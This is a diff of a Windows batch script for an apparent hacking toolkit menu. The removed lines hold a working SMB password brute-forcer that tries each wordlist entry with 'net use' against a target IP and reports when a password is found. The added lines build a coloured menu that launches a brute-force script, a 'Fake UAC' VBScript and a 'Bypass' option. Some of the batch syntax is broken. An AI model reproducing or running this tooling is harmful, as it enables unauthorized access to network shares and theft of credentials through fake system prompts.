@@ -24,47 +24,28 @@ pause
 echo [16:00] - [STARTUP] - 1
 pause
 echo #
-echo [16:00] - Insert key : "
+set /p [16:00] - Insert key : "
 echo [16:00] - Whitelisted.
-set /p [1] Checker
-set /p [2] Bruteforce
-if /p %input% EQU 1 start Checker.bat
-if /p %input% EQU 2 start BRUTEFORCE.bat
-
-echo #
-
-set /a count=1
-for /f %%a in (%wordlist%) do (
-  set pass=%%a
-  call :attempt
+:input
+ping localhost -n 1 >nul
+echo     [90;1m#═╦═══════»[0m  [92m[Bruteforce][0m [95m[1][0m
+ping localhost -n 1 >nul
+echo       [90;1m╚═╦══════»[0m  [92m[Fake UAC][0m  [95m[2][0m
+ping localhost -n 1 >nul
+echo         [90;1m╚═╦═════»[0m  [92m[Bypass][0m   [95m[3][0m
+echo|set /p=".          [90;1m╚══>[0m"
+choice /c 123 >nul
+if /I "%errorlevel%" EQU "1" (
+  start bruteforce.bat
+  goto :start
 )
-echo Password not Found :(
-pause
-exit
+if /I "%errorlevel%" EQU "2" (
+  start main.vbs
+  goto :start
+)
+if /I "%errorlevel%" EQU "3" (
+  cd..
+  start files
+  goto :start
 
-:success
-echo.
-echo Password Found! %pass%
-net use \\%ip% /d /y >nul 2>&1
-pause
-exit
-
-:attempt
-net use \\%ip% /user:%user% %pass% >nul 2>&1
-echo [ATTEMPT %count%] [%pass%]
-set /a count=%count%+1
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+)
